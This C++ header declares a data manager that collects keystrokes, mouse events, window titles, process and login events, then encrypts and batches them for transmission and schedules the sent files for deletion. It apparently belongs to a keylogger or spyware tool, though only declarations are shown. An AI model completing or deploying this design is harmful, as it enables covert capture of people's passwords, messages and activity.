#ifndef DATAMANAGER_H
#define DATAMANAGER_H

#include "data/KeyData.h"
#include "utils/SystemUtils.h"
#include "data/SystemData.h"
#include "core/Platform.h"
#include <string>
#include <vector>
#include <mutex>
#include <chrono>   

// Forward declarations
class Configuration;

struct MouseData {
    uint64_t timestamp;
    enum class EventType { 
        MOUSE_MOVE,
        MOUSE_DOWN,
        MOUSE_UP,
        MOUSE_WHEEL,
        MOUSE_CLICK
    };
    EventType eventType;
    
    enum class Button {
        NONE,
        LEFT,
        RIGHT,
        MIDDLE,
        X1,
        X2
    };
    Button button;
    
    struct Position {
        int x;
        int y;
    };
    Position position;
    
    int wheelDelta;
    std::string windowTitle;
};

struct SystemEventData {
    uint64_t timestamp;
    enum class EventType { 
        PROCESS_START,
        PROCESS_END,
        WINDOW_OPEN,
        WINDOW_CLOSE,
        SYSTEM_LOCK,
        SYSTEM_UNLOCK,
        USER_LOGIN,
        USER_LOGOUT
    };
    EventType eventType;
    std::string windowTitle;
    std::string processName;
    std::string extraInfo;
};

class DataManager {
public:
    explicit DataManager(Configuration* config);
    ~DataManager();
    
    void AddKeyData(const KeyData& keyData);
    void AddMouseData(const MouseData& mouseData);
    void AddSystemData(const SystemInfo& systemInfo);
    void AddSystemEventData(const SystemEventData& eventData);
    
    std::vector<uint8_t> RetrieveEncryptedData();
    void ClearData();
    bool HasData() const;
    
    // Batch collection methods
    void StartBatchCollection();
    bool IsBatchReady() const;
    std::vector<uint8_t> GetBatchData();
    
private:
    Configuration* m_config;
    std::string m_storagePath;
    std::string m_currentDataFile;
    size_t m_maxBufferSize;
    
    mutable std::mutex m_dataMutex;
    std::string m_keyDataBuffer;
    std::string m_mouseDataBuffer;
    std::string m_systemDataBuffer;
    std::string m_systemEventBuffer;
    
    // Batch collection members
    std::chrono::steady_clock::time_point m_batchStartTime;
    std::vector<uint8_t> m_batchData;
    
    void InitializeStorage();
    void FlushAllData();
    void FlushKeyData();
    void FlushMouseData();
    void FlushSystemData();
    void FlushSystemEvents();
    void AppendToFile(const std::string& path, const std::string& data);
    void RotateDataFileIfNeeded();
    void RotateDataFile();
    
    std::vector<std::string> GetDataFilesReadyForTransmission();
    void MarkFileAsTransmitted(const std::string& filePath);
    void ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs);
    
    static std::string KeyDataToString(const KeyData& data);
    static std::string MouseDataToString(const MouseData& data);
    static std::string SystemInfoToString(const SystemInfo& info);
    std::string SystemEventToString(const SystemEventData& event) const;
    std::string GenerateBatchId() const;
};

#endif